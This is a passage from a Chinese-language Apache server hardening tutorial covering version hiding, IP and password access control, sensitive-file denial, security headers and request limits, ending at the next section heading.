<h2 id="五安全配置">五、安全配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#五安全配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
<h3 id="1-隐藏apache版本和系统信息">1. 隐藏Apache版本和系统信息<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#1-隐藏apache版本和系统信息" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 编辑安全配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/conf-enabled/security.conf</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 修改以下配置</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ServerTokens</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Prod</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">          # 仅显示&quot;Apache&quot;</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">ServerSignature</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Off</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">        # 关闭页面签名</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">TraceEnable</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> Off</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">           # 禁用TRACE方法</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 可选：完全隐藏服务器信息</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># ServerTokens ProductOnly</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># Header always unset &quot;X-Powered-By&quot;</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 重启服务</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> systemctl</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> restart</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> apache2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 验证</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -I</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> http://localhost</span></span></code></pre></figure>
<h3 id="2-目录访问控制">2. 目录访问控制<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#2-目录访问控制" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁止目录浏览</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> -Indexes</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 基于IP的访问控制（允许特定IP）</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/admin</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ip </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">192</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">168</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">24</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ip </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">127</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> ip ::</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 拒绝特定IP</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/public</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;RequireAll></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> not ip </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">10</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">8</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/RequireAll></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 基于用户代理的控制</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;RequireAll></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all granted</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> not env blockbots</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/RequireAll></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    SetEnvIfNoCase</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> User</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">-Agent &quot;BadBot&quot; blockbots</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="3-基于密码的访问控制">3. 基于密码的访问控制<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#3-基于密码的访问控制" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 创建密码文件（第一个用户使用-c创建文件）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> htpasswd</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -c</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/.htpasswd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> admin</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 添加更多用户（不使用-c）</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> htpasswd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/.htpasswd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> user2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 删除用户</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> htpasswd</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -D</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/.htpasswd</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> user2</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 查看用户列表</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/.htpasswd</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 配置认证</span></span>
<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">sudo</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> nano</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /etc/apache2/sites-available/000-default.conf</span></span></code></pre></figure>
<p><strong>认证配置示例：</strong></p>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/secure</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AuthType</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Basic</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AuthName</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;Restricted Area - Authentication Required&quot;</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AuthUserFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> /etc/apache2/.htpasswd</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> valid-user</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 或指定特定用户</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # Require user admin user2</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 或指定用户组</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # AuthGroupFile /etc/apache2/.htgroup</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # Require group admins</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="4-文件和目录安全">4. 文件和目录安全<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-文件和目录安全" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 保护敏感文件</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;^\.ht&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;\.(bak|config|sql|log|sh)$&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">FilesMatch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 禁止执行某些目录中的PHP</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html/uploads</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    php_flag</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> engine</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> off</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    AddType</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> text/plain</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> .php .php3 .phtml</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 限制HTTP方法</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> /var/www/html</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">LimitExcept</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> GET POST</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">        Require</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> all denied</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    &lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">LimitExcept</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">Directory</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="5-防止点击劫持和xss">5. 防止点击劫持和XSS<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-防止点击劫持和xss" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 启用headers模块</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">sudo a2enmod headers</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 添加安全头</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> mod_headers.c</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 防止点击劫持</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-Frame-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;SAMEORIGIN&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # XSS保护</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-XSS-Protection &quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">; mode=block&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 防止MIME类型嗅探</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> X-Content-Type-</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Options</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> &quot;nosniff&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 引荐来源政策</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Referrer-Policy &quot;strict-origin-when-cross-origin&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # 内容安全策略</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">    Header</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> always </span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">set</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> Content-Security-Policy &quot;default-src 'self'&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">    </span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # HSTS（仅HTTPS使用）</span></span>
<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">    # Header always set Strict-Transport-Security &quot;max-age=31536000; includeSubDomains&quot;</span></span>
<span data-line><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;/</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">IfModule</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">></span></span></code></pre></figure>
<h3 id="6-限制请求大小和超时">6. 限制请求大小和超时<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#6-限制请求大小和超时" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="apache" data-theme="github-light github-dark"><code data-language="apache" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;"># 在apache2.conf或虚拟主机配置中添加</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestBody</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 10485760</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">        # 限制请求体为10MB</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestFields</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 100</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">           # 限制请求头字段数量</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestFieldSize</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8190</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">       # 限制请求头字段大小</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">LimitRequestLine</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 8190</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">            # 限制请求行大小</span></span>
<span data-line> </span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">Timeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 300</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">                      # 请求超时时间（秒）</span></span>
<span data-line><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">KeepAliveTimeout</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> 5</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">              # 保持连接超时时间</span></span></code></pre></figure>
<h2 id="六常用模块配置">六、常用模块配置<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#六常用模块配置" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
